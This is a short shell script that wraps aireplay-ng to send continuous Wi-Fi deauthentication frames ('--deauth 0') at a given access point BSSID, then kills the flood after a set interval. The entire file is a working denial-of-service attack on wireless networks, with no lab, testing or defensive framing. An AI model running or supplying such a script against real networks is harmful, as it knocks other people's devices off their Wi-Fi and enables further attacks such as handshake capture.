#!/bin/sh

BSSID=$1
interface=$2
interval=$3

echo $interval
aireplay-ng --deauth 0 -a $BSSID $interface & # dont forget the & otherwise you cant kill this process
aireplayPID=$!
sleep $interval
kill $aireplayPID